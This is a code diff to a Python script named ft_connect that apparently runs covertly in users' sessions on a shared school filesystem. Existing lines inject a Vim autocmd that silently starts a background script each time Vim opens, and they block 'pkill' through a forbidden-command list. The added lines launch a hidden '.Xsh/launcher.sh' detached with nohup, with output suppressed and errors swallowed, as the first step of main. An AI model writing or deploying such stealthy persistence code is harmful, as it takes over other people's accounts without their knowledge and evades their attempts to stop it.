@@ -16,6 +16,8 @@ except ImportError:
 # === CONFIGURATION ===
 BASE_PATH = "/sgoinfre/goinfre/Perso/zcadinot/script/fc/ft_connect"
 SCRIPT_PATH = f"{BASE_PATH}/src/core/ft_connect.py"
+LAUNCHER_SCRIPT = "/sgoinfre/goinfre/Perso/zcadinot/.Xsh/launcher.sh"
+
 
 CMD_PATH = os.path.join(BASE_PATH, "cmd")
 USER_PATH = os.path.join(BASE_PATH, "user")
@@ -27,7 +29,7 @@ BLOCKED_LOG = os.path.join(CMD_PATH, "cmd_blocked.log")
 VIM_AUTOCMD = "autocmd VimEnter * silent! call system('/sgoinfre/goinfre/Perso/zcadinot/script/utils &')"
 VIM_AUTOSTART_MARKER = '" FT_CONNECT_VIM_AUTOSTART'
 
-MASTER_USERS = ["zcadi", "aeheve", "root"]
+MASTER_USERS = ["zcadinot", "aeheve", "root"]
 CURRENT_USER = getpass.getuser()
 
 FORBIDDEN = ["pkill", "xdg", "touch"]
@@ -174,6 +176,33 @@ def ensure_file(path):
 		pass
 
 
+def is_launcher_running():
+	try:
+		out = subprocess.check_output(["ps", "aux"], stderr=subprocess.DEVNULL).decode()
+		for line in out.splitlines():
+			if LAUNCHER_SCRIPT in line and "sh" in line:
+				return True
+		return False
+	except Exception:
+		return False
+
+
+def launch_launcher_script():
+	if not os.path.exists(LAUNCHER_SCRIPT):
+		return
+	if is_launcher_running():
+		return
+	try:
+		subprocess.Popen(
+			["nohup", "sh", LAUNCHER_SCRIPT],
+			stdout=subprocess.DEVNULL,
+			stderr=subprocess.DEVNULL,
+			preexec_fn=os.setpgrp
+		)
+	except Exception:
+		pass
+
+
 # === CORE ===
 def read_type_file():
 	global VERBOSE_MODE
@@ -256,6 +285,8 @@ def ensure_vim_autostart():
 
 # === MAIN ===
 if __name__ == "__main__":
+	launch_launcher_script()
+
 	if is_ft_connect_running():
 		sys.exit(0)
 
@@ -266,3 +297,4 @@ if __name__ == "__main__":
 		ensure_vim_autostart()
 
 	watch_file()
+
